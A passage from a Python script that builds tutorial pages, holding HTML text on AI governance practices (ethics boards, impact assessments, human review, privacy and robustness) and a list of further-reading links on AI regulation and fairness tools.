             "<p>Implement <strong>AI governance</strong> within your organization: (1) establish an <strong>AI Ethics Board</strong> (cross-functional: legal, engineering, product, DEI), (2) create <strong>ethical AI checklists</strong> for each project phase (design → development → deployment → monitoring), (3) conduct <strong>impact assessments</strong> for high-risk applications, (4) maintain <strong>model inventory</strong> with risk ratings and mitigation plans, (5) implement <strong>human-in-the-loop</strong> for consequential decisions (hiring, lending, medical diagnosis), (6) provide <strong>appeal mechanisms</strong> for automated decisions affecting individuals.</p>"
             "<ul>"
             "<li><strong>Privacy</strong> — differential privacy, data minimization, consent management (GDPR)</li>"
             "<li><strong>Accountability</strong> — documented decision pathways, audit trails, responsible AI owner</li>"
             "<li><strong>Robustness</strong> — adversarial testing, distribution shift monitoring, fallback strategies</li>"
             "<li><strong>Inclusivity</strong> — diverse training data, multi-language support, accessibility testing</li>"
             "</ul>"),
        ],
        further=[
            ("EU AI Act Overview", "European Commission's official page on the AI Act regulatory framework.", "https://artificialintelligenceact.eu/"),
            ("Fairlearn Documentation", "Microsoft's toolkit for assessing and mitigating unfairness in ML systems.", "https://fairlearn.org/"),
            ("SHAP Documentation", "SHAP library for model interpretability and feature importance analysis.", "https://shap.readthedocs.io/"),
            ("NIST AI Risk Management Framework", "U.S. framework for managing AI risks across the lifecycle.", "https://www.nist.gov/ai-rmf"),
        ],
    )


if __name__ == "__main__":
    os.makedirs(TUTS, exist_ok=True)
    generate_part2()
